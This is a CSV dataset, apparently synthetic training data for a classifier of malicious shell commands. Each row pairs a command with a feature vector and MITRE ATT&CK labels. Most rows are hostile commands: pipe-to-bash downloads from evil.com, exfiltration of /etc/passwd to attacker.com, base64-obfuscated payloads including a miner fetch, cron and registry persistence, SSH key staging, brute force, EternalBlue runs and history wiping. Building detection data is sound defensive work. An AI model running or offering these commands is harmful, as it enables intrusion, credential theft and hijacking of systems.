command,features,label,source
time echo 'aXAgbGluayBzaG93IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate *.pdf | xargs cp -t /tmp/loot/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1005_Data_from_Local_System'],synthetic
echo 'ZG1lc2cgfCBncmVwIC1pICd2aXJ0dWFsXHx2bXdhcmVcfGt2bVx8eGVuJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1497_Virtualization_Sandbox_Evasion', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemd-detect-virt,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]",['T1053_Scheduled_Task'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
mv malware.sh .legit.sh ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1036_Masquerading', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
"gdb -p $(pgrep sshd) -batch -ex 'call system(""/tmp/payload"")' | > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.48, 1, 0]","['T1055_Process_Injection', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mkdir  -p  /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find / -perm -4000 -type f 2>/dev/null ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"python3 -c ""import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1132_Data_Encoding'],synthetic
wget  -q  -O-  --header='X-Auth:  token123'  http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo dmesg | grep -i 'virtual\|vmware\|kvm\|xen',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.8, 0.24, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
echo 'bWtkaXIgL3RtcC8uc3RhZ2luZyAmJiBjcCAtciAvaG9tZS8qLy5zc2ggL3RtcC8uc3RhZ2luZy8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1074_Data_Staged', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nmap -sn 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'd2hvYW1pIC9hbGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
chisel server --port 8080 --reverse ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1219_Remote_Access_Software', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -D 1080 -f -N user@jump.host,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1090_Proxy'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
grep -r 'password' /var/www/html --include='*.php' && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup getent passwd | awk -F: '$3 >= 1000' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"python3 -c ""import subprocess; [subprocess.run(l.strip(),shell=True) for l in open('/tmp/cmds')]""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
"python3  -c  ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
LD_PRELOAD=/tmp/evil.so /usr/bin/sudo whoami,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1055_Process_Injection'],synthetic
groups | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
mkdir /tmp/.staging && cp -r /home/*/.ssh /tmp/.staging/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1074_Data_Staged'],synthetic
echo 'aGVsbG8gd29ybGQ=' | base64 -d,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'aGVsbG8gd29ybGQ=' | base64 -d,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'aG9zdG5hbWVjdGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo whoami /all,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup wget --post-file=/etc/passwd http://attacker.com/receive &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""uptime""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.56, 0, 0]",['T1110_Brute_Force'],synthetic
sudo msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ifconfig -a && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run' &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
"bash -c ""Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP | sleep 1""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1197_BITS_Jobs', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd  -m  -s  /bin/bash  hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
grep -rn 'password\|secret\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.4, 0.32, 0, 0]",['T1119_Automated_Collection'],synthetic
sudo echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmUgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"time python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
sudo history -c && history -w,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""ping -c 4 8.8.8.8""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
time getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
grep -rn 'password\|secret\|token' /etc/ /home/ 2>/dev/null > /tmp/secrets.txt,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.4, 0.32, 0, 0]",['T1119_Automated_Collection'],synthetic
cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1176_Browser_Extensions'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
powershell.exe -EncodedCommand JABzA... && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'cmVnIHF1ZXJ5IEhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1012_Query_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
salt  '*'  cmd.run  'curl  http://evil.com  |  bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/enc_shadow | > /dev/null 2>&1,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1132_Data_Encoding', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
proxychains nmap -sV 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1090_Proxy'],synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nmap -A -T4 192.168.1.0/24 | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
ffmpeg -f alsa -i default -t 60 /tmp/mic.mp3,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1123_Audio_Capture'],synthetic
"bash -c ""Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP && chmod +x /tmp/payload""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1197_BITS_Jobs', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd  -m  -s  /bin/bash  -G  sudo  newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
ngrok http 80 --log=stdout | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1219_Remote_Access_Software', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat  /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe""","[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /etc/group ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser  -l  postgres  -c  'psql  -c  ""SELECT  pg_read_file(\'/etc/passwd\')""'  &&  history  -c","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnKi5rZGJ4JyAyPi9kZXYvbnVsbA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1005_Data_from_Local_System', 'T1027_Obfuscated_Files_or_Information']",synthetic
time msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
echo  'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'YXJwIC1h' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Li9wd25raXQgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time cat /etc/shadow | base64 > /tmp/encoded.b64,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1132_Data_Encoding'],synthetic
sudo echo 'Li9DVkUtMjAyMS00MDM0IDsgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ngrok http 80 --log=stdout,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1219_Remote_Access_Software'],synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmic  useraccount  list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
sudo certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup arecord -d 60 -f cd /tmp/audio.wav &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1123_Audio_Capture'],synthetic
nohup getent passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
sudo find / -name '*.docx' -exec cp {} /tmp/collected/ \;,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1119_Automated_Collection'],synthetic
mkdir /tmp/.staging && cp -r /home/*/.ssh /tmp/.staging/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1074_Data_Staged'],synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
nmap  --script=vuln  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"nohup gdb -p $(pgrep sshd) -batch -ex 'call system(""/tmp/payload"")' ; chmod +x /tmp/payload &","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]","['T1055_Process_Injection', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'dGFyIC1jemYgL3RtcC9kYXRhLnRhci5neiAvaG9tZS8qL0RvY3VtZW50cyB8ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1074_Data_Staged', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
